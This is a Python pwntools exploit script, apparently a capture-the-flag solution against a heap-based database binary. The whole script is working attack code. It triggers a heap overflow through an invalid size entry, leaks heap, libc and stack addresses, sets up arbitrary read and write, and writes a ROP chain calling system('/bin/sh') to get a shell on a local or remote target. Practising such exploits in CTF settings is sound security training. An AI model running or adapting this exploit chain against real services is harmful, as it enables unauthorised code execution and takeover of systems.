#!/usr/bin/python3

"""
$ ./solve.py -r 127.0.0.1 31337
$ whoami
ctf
"""

import argparse
from pwn import *

context.log_level = "error"
context.binary = ELF("./db_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def add_entry(index:bytes, size:bytes, value:bytes):
    p.sendline(b"1")
    p.recvuntil(b"idx: ")
    p.sendline(index)
    p.recvuntil(b"size: ")
    p.sendline(size)
    p.recvuntil(b"data: ")
    p.send(value)
    p.recvuntil(b"> ")

# Add an entry with incorrect size
def add_entry_error(index:bytes, size:bytes):
    p.sendline(b"1")
    p.recvuntil(b"idx: ")
    p.sendline(index)
    p.recvuntil(b"size: ")
    p.sendline(size)
    p.recvuntil(b"> ")

def edit_entry(index:bytes, value:bytes):
    p.sendline(b"2")
    p.recvuntil(b"idx: ")
    p.sendline(index)
    p.recvuntil(b"data: ")
    p.send(value)
    p.recvuntil(b"> ", timeout=1) # Won't receive this on last write, so timeout added not to get stuck

def remove(index:bytes):
    p.sendline(b"3")
    p.recvuntil(b"idx: ")
    p.sendline(index)
    p.recvuntil(b"> ")

def view(index:bytes):
    p.sendline(b"4")
    p.recvuntil(b"idx: ")
    p.sendline(index)
    p.recvuntil(b"data: ")
    data = p.recvuntil(b"===").replace(b"\n===", b"")
    p.recvuntil(b"> ")
    return data

# Sets up arbitrary read and write
# Creates an unsorted bin chunk
# Returns the heap's base address
def initialize():
    # Setting up the overflow
    add_entry(b"1", b"8", b"A"*8)
    add_entry(b"2", b"8", b"B"*8)
    remove(b"1")
    add_entry_error(b"1", b"10000")

    # Getting the heap leak
    edit_entry(b"1", b"C"*49)
    leak = view(b"1").replace(b"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", b"")
    heap_base = int.from_bytes(b"\x00"+leak, "little") - 768
    #print(f"Heap base: {hex(heap_base)}")

    # Restoring the heap
    overwrite_ptr(b"\x00")

    return heap_base

# Overwriting second chunk's pointer
def overwrite_ptr(address:bytes):
    # Writing a clean heap not to sigsegv
    payload = b"".join([
        b"C"*16,
        p64(0),
        p64(0x21),
        p64(0x2),
        p64(0xffff), # Size set to 0xfff to write more bytes
        address,
    ])
    edit_entry(b"1", payload)

def read(address:bytes):
    overwrite_ptr(address)
    leak = view(b"2")
    return leak

def write(address:bytes, value:bytes):
    overwrite_ptr(address)
    edit_entry(b"2", value)

# Creates an unsorted bin chunk
def unsorted_bin():
    for i in range(9):
        add_entry(str(i+3).encode(), b"121", b"Z"*121)
    for i in range(9):
        remove(str(i+3).encode())

parser = argparse.ArgumentParser()
exclusive = parser.add_mutually_exclusive_group()
exclusive.add_argument("-d", "--debug", action="store_true", help="run in debug mode")
exclusive.add_argument("-r", "--remote", nargs=2, metavar=("IP", "PORT"), help="run on given IP and port")
args = parser.parse_args()

if args.remote:
    ip = args.remote[0]
    port = int(args.remote[1])
    p = remote(ip, port)
elif args.debug:
    p = process()
    os.system(f"printf 'attach {p.pid}' | xclip -sel c")
    pause()
else:
    p = process()

p.recvuntil(b"> ")
heap_base = initialize()

# Leaking the libc
unsorted_bin() # Creating an unsorted bin chunk to have a pointer to the main arena on the heap

leak = read(p64(heap_base+2000)) # Reading that pointer
libc.address = int.from_bytes(leak, "little") - libc.sym["main_arena"] - 96
#print(f"Libc: {hex(libc.address)}")

# Leaking the stack
leak = read(p64(libc.sym["environ"]))
environ = int.from_bytes(leak, "little")
#print(f"Environ: {hex(environ)}")

# ROP chain
system = p64(libc.sym["system"])
sh = p64(next(libc.search(b"/bin/sh")))
pop_rdi = p64(0x000000000010f75b + libc.address) # pop rdi ; ret
ret = p64(0x000000000002882f + libc.address) # ret

payload = b"".join([
    pop_rdi,
    sh,
    ret,
    system,
])
write(p64(environ-352), payload)
p.interactive()
